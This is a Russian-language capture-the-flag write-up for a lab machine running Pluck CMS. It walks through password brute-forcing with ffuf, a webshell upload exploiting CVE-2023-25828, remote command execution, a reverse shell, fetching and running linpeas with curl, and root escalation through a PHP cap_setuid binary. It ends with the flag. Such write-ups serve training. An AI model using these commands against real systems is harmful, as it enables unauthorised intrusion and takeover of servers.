# Plucky-plucky

## Описание:
| Название | Сложность | Автор |
|------|-----|-------|
| Plucky-plucky | легкий | @collapsz |
## TLDR:

**CVE-2023-25828** в Pluck CMS, повышение привилегий через Linux Capabilities 

---
## Решение:
На веб-интерфейсе нас встречает система управления контентом Pluck CMS:

![изображение](https://github.com/user-attachments/assets/6c697af9-4fce-47e3-be79-8cff9caa9979)

Версия которой шустро узнается при помощи, например, `whatweb`:

![изображение](https://github.com/user-attachments/assets/ebdf199f-70cb-440c-94d8-f48acbf91097)

Шустрый ресерч подскажет нам вектор развития атаки: 

![изображение](https://github.com/user-attachments/assets/54119ae9-7d08-4672-9e72-3f7164fb7222)

Уязвимость в одном из модулей обработки изображений, однако она является `Authenticated`, значит нам нужно авторизоваться.
Пароль нам неизвестен, поэтому `ffuf` в помощь:

```
ffuf -u 'http://plucky.rdg/login.php' -d 'cont1=FUZZ&bogus=&submit=Log+in' -w /usr/share/wordlists/rockyou.txt
```
Узнаем пароль админа – `plucky12`, авторизуемся с ним и попадаем в админку. Дальше все как описано в CVE. 

Воспользуемся [Jellypeg](https://github.com/jra89/Jellypeg) для генерации полезной нагрузки, предварительно немного подредактировав скрипт и указав URL на существующее изображение:

![изображение](https://github.com/user-attachments/assets/69f2db36-98ba-47a0-b2c7-26b2ff136fb1)

Грузим нашу картинку (важно, чтобы расширение было легитимное):

![изображение](https://github.com/user-attachments/assets/14f68026-a3d5-410e-8287-327bb27bdbae)

Перехватываем запрос и в конец `filename` приписываем `.php`:
![изображение](https://github.com/user-attachments/assets/df9bd8c2-30b5-4d86-9e3b-057b75080acd)

![изображение](https://github.com/user-attachments/assets/09297685-df0f-4639-b6a1-ea85caa9901e)

"Картинка" успешно загружена:

![изображение](https://github.com/user-attachments/assets/38fdeadf-9aa0-4c28-865d-590baecc1860)

А на ручке `/images/image.jpg.php?c=id` нас уже ожидает RCE:

![изображение](https://github.com/user-attachments/assets/74aefae9-7e6d-441b-a57f-ee38832d98c3)

Пробрасываем себе реверс-шелл любым удобным способом:

![изображение](https://github.com/user-attachments/assets/ccdaa9e0-e31d-4d26-af90-5bebf5b1af84)

Для удобного перечисления ресурсов системы воспользуемся Linpeas:

```
curl https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lin.sh && chmod +x /tmp/lin.sh && /tmp/lin.sh
```
Находим следующее:
```
www-data@c7e915851f7d:/var/www/html# getcap $(which php8.1)
/usr/bin/php8.1 cap_setuid=ep
```
Повышаемся [всем известный ресурс в помощь](https://gtfobins.github.io/gtfobins/php/):
```
CMD="/bin/sh"
$(which php8.1) -r "posix_setuid(0); system('$CMD');"
id
uid=0(root)
```
## Flag:
RDG{c63402a45aad5057636a6c456e1617ef}
